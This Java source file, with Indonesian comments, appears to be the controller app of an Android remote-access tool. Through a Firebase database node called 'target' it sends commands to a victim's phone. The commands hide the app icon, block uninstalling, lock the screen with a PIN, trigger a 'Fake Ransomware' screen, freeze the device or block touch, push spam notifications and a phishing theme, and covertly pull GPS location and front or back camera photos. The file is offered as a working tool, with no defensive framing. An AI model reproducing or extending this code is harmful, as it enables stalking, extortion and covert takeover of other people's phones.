package com.paragon.control;

import android.app.AlertDialog;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.InputType;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private DatabaseReference mDatabase;
    private StorageReference mStorage;

    // Header
    private TextView tvDeviceName, tvDeviceId, tvStatus, tvBattery;
    private TextView tvDeviceName2, tvDeviceId2;
    private TextView tvAntiUninstallText;
    private Switch swAntiUninstall;

    // Card components
    private Switch swFlashlight, swLockLow, swLockCustom, swHideIcon, swNgehang;
    private TextView tvFlashlightStatus, tvLockLowStatus, tvLockCustomStatus, tvHideIconStatus, tvNgehangStatus;
    private TextView tvNamaFlashlight, tvNamaLockLow, tvNamaLockCustom, tvNamaHideIcon, tvNamaNgehang;
    private ImageView ivFlashlight, ivLockLow, ivLockCustom, ivHideIcon, ivNgehang;

    private Button btnGanti, btnSetServer;
    private EditText etServerUrl;

    private static final int REQUEST_VIDEO = 1001;

    private ValueEventListener deviceListener;
    private ValueEventListener antiUninstallListener;
    private ValueEventListener flashlightListener;
    private ValueEventListener lockLowListener;
    private ValueEventListener lockCustomListener;
    private ValueEventListener hideIconListener;
    private ValueEventListener ngehangListener;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        mDatabase = database.getReference("target");
        mStorage = FirebaseStorage.getInstance().getReference();

        // ===== INISIALISASI VIEW =====
        // Header
        tvDeviceName = findViewById(R.id.tvDeviceName);
        tvDeviceId = findViewById(R.id.tvDeviceId);
        tvStatus = findViewById(R.id.tvStatus);
        tvBattery = findViewById(R.id.tvBattery);
        tvDeviceName2 = findViewById(R.id.tvDeviceName2);
        tvDeviceId2 = findViewById(R.id.tvDeviceId2);

        // Anti Uninstall
        tvAntiUninstallText = findViewById(R.id.tvAntiUninstallText);
        swAntiUninstall = findViewById(R.id.swAntiUninstall);

        // Buttons
        btnGanti = findViewById(R.id.btnGanti);
        btnSetServer = findViewById(R.id.btnSetServer);
        etServerUrl = findViewById(R.id.etServerUrl);

        // ===== AMBIL REFERENSI SWITCH & TEXTVIEW DARI CARD =====
        // Flashlight
        View cardFlashlight = findViewById(R.id.cardFlashlight);
        swFlashlight = cardFlashlight.findViewById(R.id.swFitur);
        tvFlashlightStatus = cardFlashlight.findViewById(R.id.tvStatusFitur);
        tvNamaFlashlight = cardFlashlight.findViewById(R.id.tvNamaFitur);

        // Lock Low
        View cardLockLow = findViewById(R.id.cardLockLow);
        swLockLow = cardLockLow.findViewById(R.id.swFitur);
        tvLockLowStatus = cardLockLow.findViewById(R.id.tvStatusFitur);
        tvNamaLockLow = cardLockLow.findViewById(R.id.tvNamaFitur);

        // Lock Custom
        View cardLockCustom = findViewById(R.id.cardLockCustom);
        swLockCustom = cardLockCustom.findViewById(R.id.swFitur);
        tvLockCustomStatus = cardLockCustom.findViewById(R.id.tvStatusFitur);
        tvNamaLockCustom = cardLockCustom.findViewById(R.id.tvNamaFitur);

        // Hide Icon
        View cardHideIcon = findViewById(R.id.cardHideIcon);
        swHideIcon = cardHideIcon.findViewById(R.id.swFitur);
        tvHideIconStatus = cardHideIcon.findViewById(R.id.tvStatusFitur);
        tvNamaHideIcon = cardHideIcon.findViewById(R.id.tvNamaFitur);

        // Ngehang
        View cardNgehang = findViewById(R.id.cardNgehang);
        swNgehang = cardNgehang.findViewById(R.id.swFitur);
        tvNgehangStatus = cardNgehang.findViewById(R.id.tvStatusFitur);
        tvNamaNgehang = cardNgehang.findViewById(R.id.tvNamaFitur);

        // ===== SETUP ICON =====
        // Tema Phising
        View cardTemaPhising = findViewById(R.id.cardTemaPhising);
        ImageView ivTemaPhising = cardTemaPhising.findViewById(R.id.ivIcon);
        TextView tvTemaPhising = cardTemaPhising.findViewById(R.id.tvNamaFitur);
        if (ivTemaPhising != null) ivTemaPhising.setImageResource(R.drawable.ic_flashlight);
        if (tvTemaPhising != null) tvTemaPhising.setText("Tema Phising");

        // Video Overlay
        View cardVideoOverlay = findViewById(R.id.cardVideoOverlay);
        ImageView ivVideoOverlay = cardVideoOverlay.findViewById(R.id.ivIcon);
        TextView tvVideoOverlay = cardVideoOverlay.findViewById(R.id.tvNamaFitur);
        if (ivVideoOverlay != null) ivVideoOverlay.setImageResource(R.drawable.ic_flashlight);
        if (tvVideoOverlay != null) tvVideoOverlay.setText("Video Overlay");

        // Spam Notifikasi
        View cardSpamNotif = findViewById(R.id.cardSpamNotif);
        ImageView ivSpamNotif = cardSpamNotif.findViewById(R.id.ivIcon);
        TextView tvSpamNotif = cardSpamNotif.findViewById(R.id.tvNamaFitur);
        if (ivSpamNotif != null) ivSpamNotif.setImageResource(R.drawable.ic_flashlight);
        if (tvSpamNotif != null) tvSpamNotif.setText("Spam Notifikasi");

        // Stuck Layar
        View cardStuckLayar = findViewById(R.id.cardStuckLayar);
        ImageView ivStuckLayar = cardStuckLayar.findViewById(R.id.ivIcon);
        TextView tvStuckLayar = cardStuckLayar.findViewById(R.id.tvNamaFitur);
        if (ivStuckLayar != null) ivStuckLayar.setImageResource(R.drawable.ic_flashlight);
        if (tvStuckLayar != null) tvStuckLayar.setText("Stuck Layar");

        // GPS
        View cardGPS = findViewById(R.id.cardGPS);
        ImageView ivGPS = cardGPS.findViewById(R.id.ivIcon);
        TextView tvGPS = cardGPS.findViewById(R.id.tvNamaFitur);
        if (ivGPS != null) ivGPS.setImageResource(R.drawable.ic_flashlight);
        if (tvGPS != null) tvGPS.setText("GPS");

        // Kamera
        View cardKamera = findViewById(R.id.cardKamera);
        ImageView ivKamera = cardKamera.findViewById(R.id.ivIcon);
        TextView tvKamera = cardKamera.findViewById(R.id.tvNamaFitur);
        if (ivKamera != null) ivKamera.setImageResource(R.drawable.ic_flashlight);
        if (tvKamera != null) tvKamera.setText("Kamera");

        // Fake Ransomware
        View cardRansomware = findViewById(R.id.cardRansomware);
        ImageView ivRansomware = cardRansomware.findViewById(R.id.ivIcon);
        TextView tvRansomware = cardRansomware.findViewById(R.id.tvNamaFitur);
        if (ivRansomware != null) ivRansomware.setImageResource(R.drawable.ic_flashlight);
        if (tvRansomware != null) tvRansomware.setText("Fake Ransomware");

        sendMyDeviceInfo();
        listenDeviceInfoRealtime();
        listenStatusRealtime();

        // ===== GANTI SERVER =====
        btnSetServer.setOnClickListener(v -> {
            String newUrl = etServerUrl.getText().toString().trim();
            if (!newUrl.isEmpty()) {
                mDatabase.child("serverUrl").setValue(newUrl);
                Toast.makeText(this, "✅ Server URL diubah!", Toast.LENGTH_SHORT).show();
                etServerUrl.setText("");
            } else {
                Toast.makeText(this, "❌ URL kosong!", Toast.LENGTH_SHORT).show();
            }
        });

        // ===== ANTI UNINSTALL =====
        swAntiUninstall.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("antiUninstall").setValue(isChecked);
            updateStatusText(tvAntiUninstallText, isChecked);
            Toast.makeText(this, "Anti Uninstall: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        // ===== GANTI =====
        btnGanti.setOnClickListener(v -> Toast.makeText(this, "Fitur Ganti Target", Toast.LENGTH_SHORT).show());

        // ===== FLASHLIGHT =====
        swFlashlight.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("flashlight").setValue(isChecked);
            updateStatusText(tvFlashlightStatus, isChecked);
            Toast.makeText(this, "Flashlight: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        // ===== LOCK LOW =====
        swLockLow.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("lockLow").setValue(isChecked);
            updateStatusText(tvLockLowStatus, isChecked);
            Toast.makeText(this, "Lock Low: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        // ===== LOCK CUSTOM V2 =====
        swLockCustom.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (isChecked) {
                showPinDialog("lockCustom", "🔒 Lock Custom V2");
            } else {
                mDatabase.child("lockCustom").setValue(false);
                updateStatusText(tvLockCustomStatus, false);
                Toast.makeText(this, "🔓 Lock Custom OFF", Toast.LENGTH_SHORT).show();
            }
        });

        // ===== NGEHANG =====
        swNgehang.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("ngehang").setValue(isChecked);
            updateStatusText(tvNgehangStatus, isChecked);
            Toast.makeText(this, "💀 Ngehang: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        // ===== HIDE ICON =====
        swHideIcon.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("hideIcon").setValue(isChecked);
            updateStatusText(tvHideIconStatus, isChecked);
            Toast.makeText(this, "Hide Icon: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        // ===== TEMA PHISING =====
        Button btnTemaPhising = cardTemaPhising.findViewById(R.id.btnAction);
        if (btnTemaPhising != null) {
            btnTemaPhising.setOnClickListener(v -> {
                AlertDialog.Builder builder = new AlertDialog.Builder(this);
                builder.setTitle("🎨 Tema Phising");
                final EditText input = new EditText(this);
                input.setHint("Masukkan URL icon baru...");
                builder.setView(input);
                builder.setPositiveButton("GANTI", (dialog, which) -> {
                    String url = input.getText().toString();
                    if (!url.isEmpty()) {
                        mDatabase.child("temaPhising").setValue(url);
                        Toast.makeText(this, "✅ Icon diubah!", Toast.LENGTH_SHORT).show();
                    }
                });
                builder.setNegativeButton("Batal", null);
                builder.show();
            });
        }

        // ===== VIDEO OVERLAY =====
        Button btnVideoOverlay = cardVideoOverlay.findViewById(R.id.btnAction);
        if (btnVideoOverlay != null) {
            btnVideoOverlay.setOnClickListener(v -> {
                Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                intent.setType("video/*");
                startActivityForResult(intent, REQUEST_VIDEO);
            });
        }

        // ===== SPAM NOTIFIKASI =====
        Button btnSpamNotif = cardSpamNotif.findViewById(R.id.btnAction);
        if (btnSpamNotif != null) {
            btnSpamNotif.setOnClickListener(v -> {
                AlertDialog.Builder builder = new AlertDialog.Builder(this);
                builder.setTitle("📨 Kirim Spam Notifikasi");
                final EditText input = new EditText(this);
                input.setHint("Ketik pesan spam...");
                builder.setView(input);
                builder.setPositiveButton("KIRIM", (dialog, which) -> {
                    String pesan = input.getText().toString();
                    if (!pesan.isEmpty()) {
                        mDatabase.child("spamNotif").setValue(pesan);
                        Toast.makeText(this, "✅ Spam terkirim!", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(this, "❌ Pesan kosong!", Toast.LENGTH_SHORT).show();
                    }
                });
                builder.setNegativeButton("Batal", null);
                builder.show();
            });
        }

        // ===== STUCK LAYAR =====
        Button btnStuckLayar = cardStuckLayar.findViewById(R.id.btnAction);
        if (btnStuckLayar != null) {
            btnStuckLayar.setOnClickListener(v -> {
                mDatabase.child("stuckLayar").setValue("TAP, BLOCK TOUCH");
                Toast.makeText(this, "🔒 Stuck Layar: BLOCK TOUCH", Toast.LENGTH_SHORT).show();
            });
        }

        // ===== GPS =====
        Button btnGPS = cardGPS.findViewById(R.id.btnAction);
        if (btnGPS != null) {
            btnGPS.setOnClickListener(v -> {
                mDatabase.child("command").setValue("gps");
                Toast.makeText(this, "📍 Mengambil lokasi target...", Toast.LENGTH_SHORT).show();
            });
        }

        // ===== KAMERA =====
        Button btnKamera = cardKamera.findViewById(R.id.btnAction);
        if (btnKamera != null) {
            btnKamera.setOnClickListener(v -> {
                AlertDialog.Builder builder = new AlertDialog.Builder(this);
                builder.setTitle("📸 Pilih Kamera Target");
                builder.setItems(new String[]{"📷 Kamera Depan", "📷 Kamera Belakang"}, (dialog, which) -> {
                    String command = (which == 0) ? "camera_front" : "camera_back";
                    mDatabase.child("command").setValue(command);
                    Toast.makeText(this, "📸 Mengambil foto...", Toast.LENGTH_SHORT).show();
                });
                builder.show();
            });
        }

        // ===== FAKE RANSOMWARE =====
        Button btnRansomware = cardRansomware.findViewById(R.id.btnAction);
        if (btnRansomware != null) {
            btnRansomware.setOnClickListener(v -> {
                showPinDialog("ransomware", "💰 Fake Ransomware");
            });
        }
    }

    // ===== DIALOG PIN =====
    private void showPinDialog(String command, String title) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(title);

        final EditText input = new EditText(this);
        input.setInputType(InputType.TYPE_CLASS_NUMBER | InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        input.setHint("4 digit PIN");
        input.setMaxLines(1);
        builder.setView(input);

        builder.setPositiveButton("LANJUT", (dialog, which) -> {
            String pin = input.getText().toString().trim();
            if (pin.length() == 4) {
                mDatabase.child("pin").setValue(pin);
                if (command.equals("lockCustom")) {
                    mDatabase.child("lockCustom").setValue(true);
                    updateStatusText(tvLockCustomStatus, true);
                    Toast.makeText(this, "🔒 HP Target Terkunci! PIN: " + pin, Toast.LENGTH_SHORT).show();
                } else if (command.equals("ransomware")) {
                    mDatabase.child("ransomware").setValue(true);
                    Toast.makeText(this, "💰 Target kena Ransomware! PIN: " + pin, Toast.LENGTH_SHORT).show();
                }
            } else {
                Toast.makeText(this, "❌ PIN harus 4 digit!", Toast.LENGTH_SHORT).show();
                if (command.equals("lockCustom")) {
                    swLockCustom.setChecked(false);
                }
            }
        });

        builder.setNegativeButton("Batal", (dialog, which) -> {
            if (command.equals("lockCustom")) {
                swLockCustom.setChecked(false);
                updateStatusText(tvLockCustomStatus, false);
            }
            dialog.cancel();
        });

        builder.setOnCancelListener(dialog -> {
            if (command.equals("lockCustom")) {
                swLockCustom.setChecked(false);
                updateStatusText(tvLockCustomStatus, false);
            }
        });

        builder.show();
    }

    // ===== UPDATE STATUS TEXT =====
    private void updateStatusText(TextView tv, boolean isOn) {
        tv.setText(isOn ? "ON" : "OFF");
        tv.setTextColor(isOn ? 0xFF4ADE80 : 0xFFFF5C7C);
    }

    // ===== REAL-TIME: DATA TARGET =====
    private void listenDeviceInfoRealtime() {
        deviceListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    String deviceName = snapshot.child("deviceName").getValue(String.class);
                    String deviceId = snapshot.child("deviceId").getValue(String.class);
                    Integer battery = snapshot.child("battery").getValue(Integer.class);
                    Boolean online = snapshot.child("online").getValue(Boolean.class);
                    runOnUiThread(() -> {
                        if (deviceName != null) {
                            tvDeviceName.setText(deviceName);
                            tvDeviceName2.setText(deviceName);
                        }
                        if (deviceId != null) {
                            tvDeviceId.setText(deviceId);
                            tvDeviceId2.setText(deviceId);
                        }
                        if (battery != null) tvBattery.setText(battery + "%");
                        if (online != null) {
                            tvStatus.setText(online ? "ONLINE" : "OFFLINE");
                            tvStatus.setTextColor(online ? 0xFF4ADE80 : 0xFFFF5C7C);
                        }
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("deviceInfo").addValueEventListener(deviceListener);
    }

    // ===== REAL-TIME: STATUS =====
    private void listenStatusRealtime() {
        // Flashlight
        flashlightListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        swFlashlight.setChecked(value);
                        updateStatusText(tvFlashlightStatus, value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("flashlight").addValueEventListener(flashlightListener);

        // Lock Low
        lockLowListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        swLockLow.setChecked(value);
                        updateStatusText(tvLockLowStatus, value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("lockLow").addValueEventListener(lockLowListener);

        // Lock Custom
        lockCustomListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        swLockCustom.setChecked(value);
                        updateStatusText(tvLockCustomStatus, value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("lockCustom").addValueEventListener(lockCustomListener);

        // Hide Icon
        hideIconListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        swHideIcon.setChecked(value);
                        updateStatusText(tvHideIconStatus, value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("hideIcon").addValueEventListener(hideIconListener);

        // Anti Uninstall
        antiUninstallListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        swAntiUninstall.setChecked(value);
                        updateStatusText(tvAntiUninstallText, value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("antiUninstall").addValueEventListener(antiUninstallListener);

        // Ngehang
        ngehangListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        swNgehang.setChecked(value);
                        updateStatusText(tvNgehangStatus, value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("ngehang").addValueEventListener(ngehangListener);
    }

    // ===== SEND DEVICE INFO =====
    private void sendMyDeviceInfo() {
        String deviceName = Build.MODEL;
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        int battery = getBatteryLevel();
        Map<String, Object> data = new HashMap<>();
        data.put("deviceName", deviceName);
        data.put("deviceId", deviceId);
        data.put("battery", battery);
        data.put("online", true);
        data.put("timestamp", System.currentTimeMillis());
        mDatabase.child("deviceInfo").setValue(data);
    }

    private int getBatteryLevel() {
        android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
        return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_VIDEO && resultCode == RESULT_OK && data != null) {
            Uri videoUri = data.getData();
            uploadVideoToFirebase(videoUri);
        }
    }

    private void uploadVideoToFirebase(Uri videoUri) {
        Toast.makeText(this, "📤 Uploading video...", Toast.LENGTH_SHORT).show();
        StorageReference ref = mStorage.child("videos/" + System.currentTimeMillis() + ".mp4");
        ref.putFile(videoUri).addOnSuccessListener(taskSnapshot -> {
            ref.getDownloadUrl().addOnSuccessListener(uri -> {
                mDatabase.child("videoUrl").setValue(uri.toString());
                Toast.makeText(this, "✅ Video terkirim ke target!", Toast.LENGTH_SHORT).show();
            });
        }).addOnFailureListener(e -> {
            Toast.makeText(this, "❌ Gagal upload video!", Toast.LENGTH_SHORT).show();
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (deviceListener != null) mDatabase.child("deviceInfo").removeEventListener(deviceListener);
        if (flashlightListener != null) mDatabase.child("flashlight").removeEventListener(flashlightListener);
        if (lockLowListener != null) mDatabase.child("lockLow").removeEventListener(lockLowListener);
        if (lockCustomListener != null) mDatabase.child("lockCustom").removeEventListener(lockCustomListener);
        if (hideIconListener != null) mDatabase.child("hideIcon").removeEventListener(hideIconListener);
        if (antiUninstallListener != null) mDatabase.child("antiUninstall").removeEventListener(antiUninstallListener);
        if (ngehangListener != null) mDatabase.child("ngehang").removeEventListener(ngehangListener);
    }
    }
